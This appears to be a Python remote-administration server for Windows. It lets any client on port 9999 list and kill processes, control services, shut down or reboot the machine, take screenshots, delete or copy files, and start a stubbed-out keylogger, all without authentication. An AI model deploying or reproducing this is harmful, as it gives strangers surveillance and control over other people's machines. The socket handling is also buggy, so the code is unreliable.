import socket
import subprocess
import os
import psutil
import threading
import pickle
import time
import pickle
import struct
import shutil


def send_data(sock, data):
    data = pickle.dumps(data)
    length = struct.pack('!I', len(data))  # Pack the length of data in 4 bytes
    sock.sendall(length)  # Send the length first
    sock.sendall(data)  # Then send the actual data
    
def handle_client(client_socket):
    while True:
        try:
            command = client_socket.recv(1024).decode()
            
            if not command:
                break
            
            print(f"Command: {command}")
            
            if command == "exit":
                break
            elif command == "list_apps":
                apps = list_apps()
                send_data(client_socket, apps)
            elif command.startswith("start_app "):
                app_name = command.split()[1]
                start_app(app_name)
                client_socket.send(b"App started.")
            elif command.startswith("stop_app "):
                app_name = command.split()[1]
                stop_app(app_name)
                client_socket.send(b"App stopped.")
            elif command == "list_services":
                services = list_services()
                send_data(client_socket, services)
            elif command.startswith("start_service "):
                service_name = command.split()[1]
                start_service(service_name)
                client_socket.send(b"Service started.")
            elif command.startswith("stop_service "):
                service_name = command.split()[1]
                stop_service(service_name)
                client_socket.send(b"Service stopped.")
            elif command == "shutdown":
                shutdown()
                client_socket.send(b"Shutting down.")
            elif command == "reset":
                reset()
                client_socket.send(b"Resetting.")
            elif command == "screenshot":
                img = screenshot()
                send_data(client_socket, img)
            elif command.startswith("keylogger"):
                start_keylogger(client_socket)
            elif command.startswith("delete_file "):
                file_path = command.split()[1]
                response = delete_file(file_path)
                send_data(client_socket, response)
            elif command.startswith("copy_file "):
                source = command.split()[1]
                destination = command.split()[2]
                copy_file(source, destination)
                client_socket.send(b"File copied.")
        except ConnectionResetError:
            print("Client disconnected.")
            break
        except Exception as e:
            print(f"Error: {e}")
            break
        finally:
            if client_socket:
                client_socket.close()
                
def list_apps():
    return [p.name() for p in psutil.process_iter()]

def start_app(app_name):
    try:
        subprocess.Popen(app_name)
        return b"Application started successfully."
    except Exception as e:
        return f"Failed to start application: {str(e)}".encode()

def stop_app(app_name):
    try:
        for proc in psutil.process_iter():
            if proc.name() == app_name:
                proc.kill()
                return b"Application stopped successfully."
        return b"Application not found."
    except Exception as e:
        return f"Error stopping application: {str(e)}".encode()

def list_services():
    return [s.name() for s in psutil.win_service_iter()]

def start_service(service_name):
    subprocess.call(['sc', 'start', service_name])
    return b"Service start successfully."

def stop_service(service_name):
    subprocess.call(['sc', 'stop', service_name])
    return b"Service stop successfully."

def shutdown():
    os.system("shutdown /s /t 1")

def reset():
    os.system("shutdown /r /t 1")

def screenshot():
    import pyautogui
    import io
    
    # Capture screenshot and save to an in-memory binary stream (as PNG)
    img = pyautogui.screenshot()
    img_byte_array = io.BytesIO()
    img.save(img_byte_array, format='PNG')
    
    return img_byte_array.getvalue()

def start_keylogger(client_socket):
    # Placeholder for keylogger implementation
    client_socket.send(b"Keylogger started.")

def delete_file(file_path):
    try:
        if os.path.exists(file_path):
            os.remove(file_path)
            return b"File deleted successfully."
        else:
            return b"File not found."
    except Exception as e:
        return f"Error deleting file: {str(e)}".encode()

def copy_file(source, destination):
    if os.path.exists(source):
        shutil.copy(source, destination)  # Use shutil.copy() to copy files
        return b"Copy file successfully."

def start_server():
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.bind(("0.0.0.0", 9999))
    server.listen(5)
    print("Server listening on port 9999")

    while True:
        try:
            client_socket, addr = server.accept()
            print(f"Accepted connection from {addr}")
            client_handler = threading.Thread(target=handle_client, args=(client_socket,))
            client_handler.start()
        except Exception as e:
            print(f"An error occurred: {e}")
        finally:
            client_socket.close()

if __name__ == "__main__":
    start_server()
